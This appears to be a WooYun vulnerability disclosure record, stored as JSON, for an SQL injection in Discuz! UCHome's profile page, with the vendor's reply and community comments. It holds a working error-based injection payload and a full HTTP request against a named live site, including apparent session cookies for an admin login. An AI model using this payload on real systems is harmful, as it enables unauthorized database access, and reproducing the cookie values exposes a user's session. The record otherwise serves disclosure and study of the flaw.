{"id": 578, "wybug_id": "wooyun-2014-069193", "wybug_title": "UCHOME SQL注入漏洞", "wybug_corp": "Discuz!", "wybug_author": "滨湖虎子", "wybug_date": "2014-07-21 17:50", "wybug_open_date": "2014-10-19 17:52", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-25：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-19：\t细节向公众公开  简要描述： 老牌知名程序，今天研究了一下，发现此漏洞（需要登录） 详细说明：  注册用户后，修改个人资料。抓包然后修改如下数据\ninfo[0',0,(select (1) from mysql.user where 1%3d1 and (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(substring((Select (version())),1,62)))a from information_schema.tables group by a)b)))#]=aaa\n=====================完整HTTP：\nPOST http://www.aspmpsx.com/cp.php?ac=profile&op=info&ref HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://www.aspmpsx.com/cp.phpAccept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Content-Type: application/x-www-form-urlencodedUA-CPU: AMD64Accept-Encoding: gzip, deflateConnection: Keep-AliveContent-Length: 538Host: www.aspmpsx.comPragma: no-cacheCookie: uchome_auth=7ef14AJ93VMaXgN%2FG8bk93sG%2FMXWJobCrIUN8W88w7hXFUT0lMkQ8EHzs%2FBOTghCbon2OxclXHfvNtMtYF9l; ECS[visit_times]=1; _nitcFirstTime=2014-7-1%2020%3A38%3A2; _nitcReturnTime=2014-7-1%2020%3A38%3A2; prds0[62]=62; n_prds0=13; n_prd0[62]=13; n_prd20[62]=f37516e49abff12a57c8c6f328acd355; bdshare_firstime=1404980017332; uchome_loginuser=admin; uchome__refer=%252Fadmincp.php; uchome_space_top_show=1; uchome_checkpm=1; uchome_sendmail=1name=add%27&marry=1&friend%5Bmarry%5D=0&birthyear=1989&birthmonth=2&birthday=1&friend%5Bbirth%5D=0&blood=A&friend%5Bblood%5D=0&birthprovince=%C7%E0%BA%A3&birthcity=%B5%C2%C1%EE%B9%FE&friend%5Bbirthcity%5D=0&resideprovince=%C7%E0%BA%A3&residecity=%B5%C2%C1%EE%B9%FE&friend%5Bresidecity%5D=0&profilesubmit=%B1%A3%B4%E6&formhash=8fc39a43&info[0',0,(select (1) from mysql.user where 1%3d1 and (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(substring((Select (version())),1,62)))a from information_schema.tables group by a)b)))#]=aaa\n   漏洞证明：  \n\n   修复方案：  你们比我懂   版权声明：转载请注明来源 滨湖虎子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-07-22 09:57 厂商回复：  uchome 程序已经停止维护，不过还是要感谢您对我们产品的关注，合作愉快。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-21 17:57 |    \t\tloli  \t\t\t( 普通白帽子  |\t\t\t        Rank:550 漏洞数:52        )\t\t \n  Discuz 要被玩坏了。。。    \n     2014-07-21 18:03 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  不科学    \n     2014-07-21 18:10 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  难道洞主是库带社区的一哥？    \n     2014-07-21 18:28 |    \t\t郭斯特 \t\t\t( 普通白帽子  |\t\t\t        Rank:181 漏洞数:69        | GhostWin)\t\t \n  @U神 正是    \n     2014-07-21 19:04 |    \t\t我是小号 \t\t\t( 普通白帽子  |\t\t\t        Rank:334 漏洞数:51        | Martin)\t\t \n  裤带一哥！！！    \n     2014-07-21 19:17 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  是不是还无视GPC，赞下裤袋一哥    \n     2014-07-21 19:17 |    \t\tx7iao \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:41        | 文能床上控萝莉，武能床上定人妻)\t\t \n  卧槽。    \n     2014-07-21 20:58 |    \t\t滨湖虎子 \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:6        | 阿弥陀佛)\t\t \n  编辑之后还要审核？ 麻烦@xsser帮审核下 这个漏洞已经通知了360库带计划，由于特殊原因，不好意思，我提重复了现在很想撤稿~ 求助@all    \n     2014-07-21 21:17 |    \t\tsaline \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:32        | Focus On Web Secur1ty)\t\t \n  @滨湖虎子 呵呵    \n     2014-07-22 09:18 |    \t\t冷静 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        )\t\t \n  @滨湖虎子 怎么可能让你撤稿赶快注销乌云帐号吧    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}